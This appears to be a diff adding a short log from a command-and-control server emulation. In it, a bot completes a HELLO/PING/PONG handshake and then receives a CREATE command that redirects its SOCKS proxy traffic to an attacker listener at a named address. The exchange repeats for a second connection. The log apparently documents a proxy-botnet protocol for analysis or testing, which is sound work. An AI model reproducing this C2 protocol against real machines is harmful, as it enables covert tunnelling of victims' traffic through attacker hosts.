@@ -1,0 +1,22 @@
+[13:43:51.083] [C2] listening on 138.201.195.77:9001
+[13:43:51.083] [C2] CREATE target will be 10.230.30.20:9002
+[13:44:15.881] [C2] bot connected from 172.22.0.1:57628
+[13:44:15.882] [C2] RX b'HELLO\n'
+[13:44:15.882] [C2] TX b'HELLO\n'
+[13:44:15.884] [C2] RX b'HELLO\n'
+[13:44:15.884] [C2] TX b'PING\n'
+[13:44:15.885] [C2] RX b'PONG\n'
+[13:44:15.885] [C2] TX b'WAIT\n'
+[13:44:15.885] [C2] WAIT has no response; bot sleeps about 2 seconds
+[13:44:18.086] [C2] TX b'CREATE,10.230.30.20,9002\n'
+[13:44:18.086] [C2] CREATE sent; SOCKS traffic should move to attacker listener
+[13:44:18.610] [C2] bot connected from 172.22.0.1:57636
+[13:44:18.610] [C2] RX b'HELLO\n'
+[13:44:18.610] [C2] TX b'HELLO\n'
+[13:44:18.611] [C2] RX b'HELLO\n'
+[13:44:18.611] [C2] TX b'PING\n'
+[13:44:18.612] [C2] RX b'PONG\n'
+[13:44:18.612] [C2] TX b'WAIT\n'
+[13:44:18.612] [C2] WAIT has no response; bot sleeps about 2 seconds
+[13:44:20.812] [C2] TX b'CREATE,10.230.30.20,9002\n'
+[13:44:20.813] [C2] CREATE sent; SOCKS traffic should move to attacker listener
